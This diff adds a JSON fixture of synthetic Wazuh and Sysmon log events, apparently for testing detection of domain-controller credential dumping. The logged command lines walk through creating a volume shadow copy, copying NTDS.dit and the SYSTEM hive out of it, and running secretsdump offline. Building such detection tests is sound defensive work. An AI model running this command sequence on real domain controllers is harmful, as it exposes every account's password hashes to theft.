@@ -1,0 +1,389 @@
+{
+  "_metadata": {
+    "attack_id": "T1003.003",
+    "variation": "001",
+    "name": "Shadow Copy NTDS.dit Extraction",
+    "description": "Attacker creates volume shadow copies to extract NTDS.dit and SYSTEM hive from the domain controller for offline credential extraction using secretsdump.",
+    "expected_detection": "CRITICAL",
+    "kill_chain_phase": "credential-access",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Creating volume shadow copy with vssadmin",
+      "sequence": 1,
+      "timestamp": "2026-02-21T14:30:00.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:30:00.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: Volume Shadow Copy Creation via vssadmin",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.003"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: NTDS"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708525200.400001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:30:00.000",
+              "processGuid": "{C23-0011-VSS-CREATE}",
+              "processId": "9100",
+              "image": "C:\\Windows\\System32\\vssadmin.exe",
+              "commandLine": "vssadmin create shadow /for=C:",
+              "currentDirectory": "C:\\Users\\Administrator\\",
+              "user": "CORP\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2",
+              "parentProcessGuid": "{C23-0011-VSS-PARENT}",
+              "parentProcessId": "6000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": "campaign_23",
+        "fomorian_batch": "23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Listing shadow copies to identify the new copy",
+      "sequence": 2,
+      "timestamp": "2026-02-21T14:30:30.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:30:30.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Volume Shadow Copy Listing",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.003"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: NTDS"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708525230.400002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:30:30.000",
+              "processGuid": "{C23-0012-VSS-LIST}",
+              "processId": "9150",
+              "image": "C:\\Windows\\System32\\vssadmin.exe",
+              "commandLine": "vssadmin list shadows",
+              "currentDirectory": "C:\\Users\\Administrator\\",
+              "user": "CORP\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2",
+              "parentProcessGuid": "{C23-0012-VSS-PARENT}",
+              "parentProcessId": "6000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": "campaign_23",
+        "fomorian_batch": "23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Copying NTDS.dit from shadow copy to accessible location",
+      "sequence": 3,
+      "timestamp": "2026-02-21T14:31:00.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:31:00.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: NTDS.dit Extraction from Volume Shadow Copy",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.003"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: NTDS"
+            ]
+          },
+          "firedtimes": 3,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708525260.400003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:31:00.000",
+              "processGuid": "{C23-0013-VSS-NTDS}",
+              "processId": "9200",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit C:\\Users\\Public\\ntds.dit",
+              "currentDirectory": "C:\\Users\\Administrator\\",
+              "user": "CORP\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377F4F13F1B11A51E8A8F6",
+              "parentProcessGuid": "{C23-0013-VSS-PARENT}",
+              "parentProcessId": "6000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": "campaign_23",
+        "fomorian_batch": "23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Copying SYSTEM hive from shadow copy for offline cracking",
+      "sequence": 4,
+      "timestamp": "2026-02-21T14:31:30.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:31:30.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: SYSTEM Hive Extraction from Volume Shadow Copy",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.003"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: NTDS"
+            ]
+          },
+          "firedtimes": 4,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708525290.400004",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:31:30.000",
+              "processGuid": "{C23-0014-VSS-SYSTEM}",
+              "processId": "9250",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SYSTEM C:\\Users\\Public\\system.hiv",
+              "currentDirectory": "C:\\Users\\Administrator\\",
+              "user": "CORP\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377F4F13F1B11A51E8A8F6",
+              "parentProcessGuid": "{C23-0014-VSS-PARENT}",
+              "parentProcessId": "6000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": "campaign_23",
+        "fomorian_batch": "23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Using secretsdump to extract hashes from NTDS.dit offline",
+      "sequence": 5,
+      "timestamp": "2026-02-21T14:32:30.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:32:30.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: Offline Credential Extraction via secretsdump",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.003"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: NTDS"
+            ]
+          },
+          "firedtimes": 5,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708525350.400005",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:32:30.000",
+              "processGuid": "{C23-0015-VSS-SECRETSDUMP}",
+              "processId": "9400",
+              "image": "C:\\Users\\Public\\python3.exe",
+              "commandLine": "python3 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2",
+              "parentProcessGuid": "{C23-0015-VSS-PARENT}",
+              "parentProcessId": "6000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": "campaign_23",
+        "fomorian_batch": "23"
+      }
+    }
+  ]
+}
